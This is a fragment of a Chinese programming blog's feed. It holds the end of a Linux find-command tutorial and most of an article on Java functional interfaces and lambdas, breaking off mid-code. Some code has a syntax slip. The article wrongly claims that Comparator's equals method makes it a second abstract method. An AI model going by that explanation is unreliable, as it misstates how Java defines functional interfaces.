class="line">.&#x2F;bop&#x2F;file6</span><br><span class="line">.&#x2F;bop&#x2F;file7</span><br><span class="line">.&#x2F;bop&#x2F;file8</span><br><span class="line">.&#x2F;bop&#x2F;file9</span><br></pre></td></tr></table></figure><h2 id="2-5-如何根据时间戳寻找文件"><a href="#2-5-如何根据时间戳寻找文件" class="headerlink" title="2.5 如何根据时间戳寻找文件"></a>2.5 如何根据时间戳寻找文件</h2><p>每个文件都有三个 time stamps. 用来记录当对文件进行某种操作后的结果。这三个分别是：</p><ul><li>[a] access( 读取文件内容)时间 - atime（天） amin（分钟）</li><li>[m] modify (修改了文件的内容)时间 - mtime mmin</li><li>[c] change( 修改了文件内容或它的属性（如何文件权限）) - ctime cmin</li></ul><p>-axxx -mxxx -cxxx这三种参数后也接一个数n：</p><ul><li>写作-n时， 表示n天（分钟）前置今。 如 -atime -10 十天前至今。</li><li>写作+n时，表示n天以前， 如 -atime +10 十天以前</li><li>写作n时，表示n当天</li></ul><p>假如我要找10天前到今天，“Downlaods“目录下所下过的文件,可执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ~/Downlaods -mtime -10</span><br></pre></td></tr></table></figure><p>又如找到3天前-1天前的下载文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ~/Downlaods -mtime -3 -mtime 1</span><br></pre></td></tr></table></figure><h2 id="2-6-通过文件权限找文件"><a href="#2-6-通过文件权限找文件" class="headerlink" title="2.6 通过文件权限找文件"></a>2.6 通过文件权限找文件</h2><p>这个不太常用，如找文件权限为777的文件:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -perm 777</span><br></pre></td></tr></table></figure><h2 id="2-7-newer参数"><a href="#2-7-newer参数" class="headerlink" title="2.7 -newer参数"></a>2.7 -newer参数</h2><p>-newer参数，可以用来找比某个文件新的文件，如找比file1新的文件:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -newer baz/fiel1</span><br></pre></td></tr></table></figure><h2 id="2-8-重点！-找到符合条件的文件并执行某种参数"><a href="#2-8-重点！-找到符合条件的文件并执行某种参数" class="headerlink" title="2.8 重点！ 找到符合条件的文件并执行某种参数"></a>2.8 重点！ 找到符合条件的文件并执行某种参数</h2><p>我们可以通过在find命令后添加<code>-exec 操作命令 &#123;&#125; \;</code>来执行某种命令,</p><p>如删除所有比file1新的文件，则:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -newer file1 -exec rm &#123;&#125; \;</span><br><span class="line">// 另外可写为</span><br><span class="line">find . -newer file1 -delete# 这种方式在删除大量文件时，效率更高</span><br></pre></td></tr></table></figure><p>又如，常用的批量替换某些文件的单词。</p><p>说一个我个人的案例，我在使用hexo静态博客写文件时，将categories标签，在几乎所有的文档中都写成了categrioes。</p><p>有了find指令再加上sed指令，我们就可以实现批量替换:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;*.md&quot; -exec sed -i &#x27;s/categrioes/categories/g&#x27; &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>OK, find的常用使用方法就总结到这里。更多的使用方法请参照<code>man find</code></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY3liZXJjaXRpLmJpei9mYXEvaG93dG8tZmluZGluZy1maWxlcy1ieS1kYXRlLw==" title="https://www.cyberciti.biz/faq/howto-finding-files-by-date/">Find Files By Access, Modification Date / Time Under Linux or UNIX<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zaGFwZXNoZWQuY29tL3VuaXgtZmluZC8=" title="https://shapeshed.com/unix-find/">Linux and Unix find command tutorial with examples<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> find命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java函数接口&amp;方法引用</title>
      <link href="/archives/6bef376f.html"/>
      <url>/archives/6bef376f.html</url>
      
        <content type="html"><![CDATA[<p>相信不少同学在学习java 1.8新特性时，都对java函数接口和方法引用有些困惑。在查询资料加上一些自己的理解后整理出本文，希望能够帮过理清这其中的“奥秘”。</p><a id="more"></a><h2 id="1-追追历史"><a href="#1-追追历史" class="headerlink" title="1. 追追历史"></a>1. 追追历史</h2><p>一个东西的诞生是不会没有理由的。那为什么要使用函数接口呢？</p><p>我们都知道在jdk1.8之前，要让线程run一个task，我们可以通过一个匿名内部类来实现，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java program to demonstrate functional interface </span></span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123; </span><br><span class="line">        <span class="comment">// create anonymous inner class object </span></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123; </span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123; </span><br><span class="line">                System.out.println(<span class="string">&quot;New thread created&quot;</span>); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;).start(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，我们仅仅是为了让线程打印一条语句，却写了这么多行代码。有什么办法可以简化它呢？于是，<strong>java引入了lambda表达式：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">// lambda expression to create the object </span></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;New thread created&quot;</span>);</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在代码看着舒服多了。不仅是代码行数的减少，也更直观的阐述了这个线程的工作任务。</p><p><strong>那我们想一下，什么情况下可以用lambda表达式来替代一个匿名内部类呢？</strong></p><p>答案是：如果如果这个匿名内部类只需要实现一个抽象方法。</p><h2 id="2-函数接口"><a href="#2-函数接口" class="headerlink" title="2. 函数接口"></a>2. 函数接口</h2><p>紧跟前面的答案，如果一个方法所以来的接口只有一个抽象方法，那么我们就可以用lambda表达式去替代它。这些<strong>“只有一个抽象方法”的接口</strong>（这个说明其实略有出入，后文会有解释，现在这样就可以了）就是<strong>函数接口</strong>。并且，jdk中还提供了一个注解–@FunctionalInterface，用来编译器这个接口是函数接口。当然，只要接口满足函数接口的条件，即使不加这个注解，编译器还是会认为这个接口就是函数接口。</p><p>函数接口的关键：</p><ol><li>一个函数接口只能由一个抽象方法，但是可以有多个默认实现的方法。</li><li>@FunctionalInterface注解用来确保接口不能有多尔衮抽象方法。但是一个函数接口不必一定添加这个注解。</li><li>函数接口可用lambda表达式或者方法引用来替代。</li></ol><h3 id="2-1-JDK中的函数接口包"><a href="#2-1-JDK中的函数接口包" class="headerlink" title="2.1 JDK中的函数接口包"></a>2.1 JDK中的函数接口包</h3><p>JDK的函数接口包中大体上可以分成4类：</p><ul><li>Consumer： 消费器</li><li>Supplier： 生产器</li><li>Predicate： 判断器</li><li>Function： 转换器</li></ul><h4 id="2-1-1-Consumer"><a href="#2-1-1-Consumer" class="headerlink" title="2.1.1 Consumer"></a>2.1.1 Consumer</h4><p>Consumer接口一个参数，并且返回一个void（即不返回），所以叫做“消费”。</p><p>其内部包含两个方法：</p><ul><li>accept 抽象方法</li><li>andThen 默认实现方法</li></ul><p>下面举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConsumerFunctionExample</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      List&lt;Integer&gt; integerList= Arrays.asList(<span class="number">1</span>, <span class="number">10</span>, <span class="number">200</span>, <span class="number">101</span>, -<span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line">      printList(integerList, (v -&gt; System.out.println(v)));<span class="comment">// 此处的lambda表达式，代替了printList方法中的函数接口</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printList</span><span class="params">(List&lt;Integer&gt; listOfIntegers, Consumer&lt;Integer&gt; consumer&#123;</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">for</span>(Integer integer:listOfIntegers)</span></span>&#123;</span><br><span class="line">         consumer.accept(integer);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又或者：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConsumerFunctionExample</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      <span class="comment">// 引用一个lambda表达式</span></span><br><span class="line">      Consumer&lt;Integer&gt; consumer= i-&gt; System.out.print(i);</span><br><span class="line">      List&lt;Integer&gt; integerList= Arrays.asList(<span class="number">1</span>, <span class="number">10</span>, <span class="number">200</span>, <span class="number">101</span>, -<span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line">      printList(integerList, consumer);</span><br><span class="line">      </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printList</span><span class="params">(List&lt;Integer&gt; listOfIntegers, Consumer&lt;Integer&gt; consumer)</span></span>&#123;</span><br><span class="line">      <span class="keyword">for</span>(Integer integer:listOfIntegers)&#123;</span><br><span class="line">         consumer.accept(integer);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>含义一样。</p><p><strong>BiConsumer</strong>，功能和Consumer一样，只不过Consumer吃一个参数，Biconsumer吃两个参数，然后两个接口都不吐任何东西。</p><h4 id="2-1-2-Supplier"><a href="#2-1-2-Supplier" class="headerlink" title="2.1.2 Supplier"></a>2.1.2 Supplier</h4><p>和Consumer相反，Supplier不吃”任何东西“，返回给我们提供东西。所以它的内部只有一个get方法。</p><p>举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SupplierFunctionExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Supplier instance with lambda expression</span></span><br><span class="line">        Supplier&lt;String&gt; helloStrSupplier = () -&gt; <span class="keyword">new</span> String(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        String helloStr = helloStrSupplier.get();</span><br><span class="line">        System.out.println(<span class="string">&quot;String in helloStr is-&gt;&quot;</span> + helloStr + <span class="string">&quot;&lt;-&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Supplier instance using method reference to default constructor</span></span><br><span class="line">        Supplier&lt;String&gt; emptyStrSupplier = String::<span class="keyword">new</span>;</span><br><span class="line">        String emptyStr = emptyStrSupplier.get();</span><br><span class="line">        System.out.println(<span class="string">&quot;String in emptyStr is-&gt;&quot;</span> + emptyStr + <span class="string">&quot;&lt;-&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Supplier instance using method reference to a static method</span></span><br><span class="line">        Supplier&lt;Date&gt; dateSupplier = SupplierFunctionExample::getSystemDate;</span><br><span class="line">        Date systemDate = dateSupplier.get();</span><br><span class="line">        System.out.println(<span class="string">&quot;systemDate-&gt;&quot;</span> + systemDate);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Date <span class="title">getSystemDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Date();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-1-3-Predicate"><a href="#2-1-3-Predicate" class="headerlink" title="2.1.3 Predicate"></a>2.1.3 Predicate</h4><p>predicate接受一个input，然后返回一个boolean。通过会把这个input用来做某种条件判断。如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PredicateFunctionExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Predicate&lt;Integer&gt; positive = i -&gt; i &gt; <span class="number">0</span>;<span class="comment">// 条件判定的实体</span></span><br><span class="line">        List&lt;Integer&gt; integerList;</span><br><span class="line">        integerList = Arrays.asList(<span class="number">1</span>, <span class="number">10</span>, <span class="number">200</span>, <span class="number">101</span>, -<span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line">        List&lt;Integer&gt; filteredList = filterList(integerList, positive);</span><br><span class="line">        </span><br><span class="line">        filteredList.forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Integer&gt; <span class="title">filterList</span><span class="params">(List&lt;Integer&gt; listOfIntegers, Predicate&lt;Integer&gt; predicate)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; filteredList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Integer integer : listOfIntegers) &#123;</span><br><span class="line">            <span class="keyword">if</span> (predicate.test(integer)) &#123;</span><br><span class="line">                filteredList.add(integer);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> filteredList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>BiPredicate</strong> ，接收两个参数来做判别。</p><h4 id="2-1-4-Function"><a href="#2-1-4-Function" class="headerlink" title="2.1.4 Function"></a>2.1.4 Function</h4><p>Function函数接口，接受一个参数然后返回一个参数（注意接收和返回可以是相同的类型，也可以是不同的类型），我个人将其称作为转换器。</p><p>举个例子:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FunctionExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Function&lt;Integer,Double&gt; converter = (t) -&gt; (<span class="keyword">double</span>)t;</span><br><span class="line">        List&lt;Integer&gt; integerList = Arrays.asList(<span class="number">1</span>, <span class="number">10</span>, <span class="number">200</span>, <span class="number">101</span>, -<span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// convert integer type to double type</span></span><br><span class="line">        List&lt;Double&gt; doubleList = listConverter(integerList,converter);</span><br><span class="line">        doubleList.forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T,U&gt; <span class="function">List&lt;U&gt; <span class="title">listConverter</span><span class="params">(List&lt;T&gt; tList, Function&lt;T,U&gt; converter)</span></span>&#123;</span><br><span class="line">        List&lt;U&gt; uList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(T t: tList)&#123;</span><br><span class="line">            uList.add(converter.apply(t));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，我们看看它的定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Function</span>&lt;<span class="title">T</span>, <span class="title">R</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Applies this function to the given argument.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> t the function argument</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the function result</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">R <span class="title">apply</span><span class="params">(T t)</span></span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到Function的泛型T，R是只能接受<strong>类类型</strong>的。那如何接收基本类型呢(int double long等)。我们这样写吗：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function&lt;<span class="keyword">int</span>,<span class="keyword">double</span>&gt; function; <span class="comment">// 显然是错的</span></span><br></pre></td></tr></table></figure><p>考虑到这个问题，jdk里面给我们提供了一些方便接口：</p><ul><li><p>基本类型转其它类型：命名方式：基本类型Function。如IntFunction,DoubleFunction等，就是接受一个int或double参数，然后一个泛型T类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IntFunction</span>&lt;<span class="title">R</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Applies this function to the given argument.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value the function argument</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the function result</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">R <span class="title">apply</span><span class="params">(<span class="keyword">int</span> value)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>其它类型转基本类型：命名方式：To基本类型Function。如ToIntFunction,ToDoubleFunction等。接受其它类型转为基本类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ToIntFunction</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Applies this function to the given argument.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value the function argument</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the function result</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">applyAsInt</span><span class="params">(T value)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h4 id="额外的命名规则："><a href="#额外的命名规则：" class="headerlink" title="额外的命名规则："></a><strong>额外的命名规则：</strong></h4><p>jdk中的接口还有额外一种命名规则，叫做从左向右指定形参的参数类型。</p><p>如： ObjIntConsumer,其实Obj表示第一个参数是一个泛型参数，第二个参数时int：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ObjIntConsumer</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Performs this operation on the given arguments.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> t the first input argument</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value the second input argument</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">accept</span><span class="params">(T t, <span class="keyword">int</span> value)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又如， <code>IntToDoubleFunction</code>.表明Function的apply参数，参数时int，返回值是double。</p><h3 id="2-2-另一些函数接口"><a href="#2-2-另一些函数接口" class="headerlink" title="2.2 另一些函数接口"></a>2.2 另一些函数接口</h3><p>除了jdk，java.util.function包下的函数接口外，还有一些函数也是函数接口。如本文最开始提到的：</p><p>Runnable,还有ActionListener, Comparable，Callable等，这些接口无一例外都只有一个抽象函数。</p><p>但是我在上文中曾提到，这样的说法其实是一点出入的。我们来看Comparator这个接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Comparator</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(T o1, T o2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span></span>;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以明显的看到，这个接口是有两个抽象函数的，但是它也用了@FunctionalInterface注解表明。</p><p>所以，这个说法是有一点出入，就我个人而言，应该是<strong>在使用时能够使用labmda式或者方法引用去完全匹配一个接口中的某个抽象方法</strong>，就算是函数接口。</p><p>如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComparatorExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student[] stus = <span class="keyword">new</span> Student[]&#123;</span><br><span class="line">                <span class="keyword">new</span> Student(<span class="number">12</span>,<span class="string">&quot;法外狂徒张三&quot;</span>),</span><br><span class="line">                <span class="keyword">new</span> Student(<span class="number">123</span>,<span class="string">&quot;李四&quot;</span>),</span><br><span class="line">                <span class="keyword">new</span> Student(<span class="number">4</span>,<span class="string">&quot;王五&quot;</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">       <span class="comment">// 此处的lambda表达完全配置Comparator#compare方法</span></span><br><span class="line">        Comparator&lt;Student&gt; comparator = (stu1,stu2)-&gt;&#123;</span><br><span class="line">            <span class="keyword">return</span> stu1.getId() - stu2.getId();</span><br><span class="line">        &#125;;</span><br><span class="line">        Arrays.sort(stus,comparator);</span><br><span class="line">        <span class="comment">// print result</span></span><br><span class="line">        Stream.of(stus).forEach(System.out::print);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> 